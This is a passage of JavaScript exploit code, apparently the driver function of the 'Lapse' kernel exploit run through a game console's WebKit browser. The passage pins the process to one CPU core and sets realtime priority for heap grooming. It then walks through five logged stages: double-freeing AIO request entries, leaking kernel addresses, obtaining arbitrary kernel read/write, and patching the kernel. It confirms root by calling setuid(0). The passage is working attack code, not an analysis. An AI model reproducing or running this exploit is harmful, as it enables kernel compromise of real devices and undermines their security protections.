  block_fd = -1;
  unblock_fd = -1;
  groom_ids = null;
  block_id = 0xffffffff;
  sds = null;
  pktopts_sds = null;
  sd_pair_main = null;
  try {
    // Save the thread's CPU core and realtime priority to maintain system stability during the exploit.
    // Stability tweaks from Al-Azif's source
    current_core = get_current_core();
    current_rtprio = get_current_rtprio();
    current_core_stored = 1;
    //log(`current core: ${current_core}`);
    //log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
    // if the first thing you do since boot is run the web browser, WebKit can
    // use all the cores
    const main_mask = new Buffer(sizeof_cpuset_t_);
    //const main_mask = new Long();
    get_cpu_affinity(main_mask);
    //log(`main_mask: ${main_mask}`);
    // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
    // spraying and grooming easier
    //log(`pinning process to core #${main_core}`);
    pin_to_core(main_core);
    //set_cpu_affinity(new Long(1 << main_core));
    get_cpu_affinity(main_mask);
    //log(`main_mask: ${main_mask}`);
    //log("setting main thread's priority");
    set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
    //sysi('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
    [block_fd, unblock_fd] = (() => {
      const unix_pair = new View4(2);
      sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
      return unix_pair;
    })();
    sds = [];
    for (var i = 0; i < num_sds; i++) {
      sds.push(new_socket());
    }
    window.log('Lapse Setup');
    await sleep(50); // Wait 50ms
    [block_id, groom_ids] = setup(block_fd);
    window.log('Lapse STAGE 1/5: Double free AIO queue entry');
    await sleep(50); // Wait 50ms
    sd_pair_main = double_free_reqs2(sds);
    window.log('Lapse STAGE 2/5: Leak kernel addresses');
    await sleep(50); // Wait 50ms
    const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair_main);
    window.log('Lapse STAGE 3/5: Double free SceKernelAioRWRequest');
    await sleep(50); // Wait 50ms
    [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair_main[0], sds);
    window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
    await sleep(50); // Wait 50ms
    const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
    window.log('Lapse STAGE 5/5: Patch kernel');
    await sleep(50); // Wait 50ms
    await patch_kernel(kbase, kmem, p_ucred, restore_info);
    doCleanup(); // Only works on success
    // Check if it all worked
    try {
      if (sysi('setuid', 0) == 0) {
        window.log("\nKernel exploit succeeded and AIO fixes applied", "green");
        return 1;
      } else {
        window.log("An error occured during if KEX succeeded test\nPlease restart console and try again...", "red");
        return 0;
      }
    } catch {
      // Still not exploited, something failed, but it made it here...
      die("kernel exploit failed!");
    }
  } catch (error) {
    window.log("An error occured during Lapse\nPlease restart console and try again...\nError definition: " + error, "red");
    // Al-Azif's minimal cleanup on failure
    if (unblock_fd !== -1) {
      try {
        close(unblock_fd);
      } catch (e) {}
      unblock_fd = -1;
    }
    return 0;
  } finally {
    // Always restore core and priority
    if (current_core_stored === 1) {
      // Restore the thread's CPU core and realtime priority to maintain system stability during the exploit.
      // Stability tweaks from Al-Azif's source
      //log(`restoring core: ${current_core}`);
      //log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
      try {
        pin_to_core(current_core);
        set_rtprio(current_rtprio);
        //window.log("CPU core restored!");
      } catch (e) {}
    }
  }
}
//================================================================================================
window.script_loaded = 1;
